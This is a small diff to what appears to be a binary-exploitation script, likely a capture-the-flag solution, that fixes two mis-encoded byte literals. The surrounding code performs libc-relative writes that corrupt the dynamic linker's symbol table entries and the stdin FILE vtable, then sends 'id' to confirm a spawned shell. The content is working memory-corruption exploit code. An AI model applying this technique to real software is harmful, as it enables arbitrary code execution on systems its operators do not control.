@@ -95,7 +95,7 @@ while not found:
             + LD_WRITABLE_BASE_OFFSET
             + LINKMAP_SYMTAB_OFFSET
         )
-        libc_relative_write(1, target, b"ð")
+        libc_relative_write(1, target, b"\xf0")
 
         # Overwrite a concrete Elf64_Sym entry
         target = (
@@ -110,7 +110,7 @@ while not found:
         # Phase 5 — Trigger runtime resolution via FILE corruption
         # -------------------------------------------------
         target = ARENA_TO_STDIN_OFFSET + STDIN_VTABLE_OFFSET + 7
-        libc_relative_write(1, target, b"ÿ")
+        libc_relative_write(1, target, b"\xff")
 
         io.sendline(b"id")
         if b"uid" in io.clean():
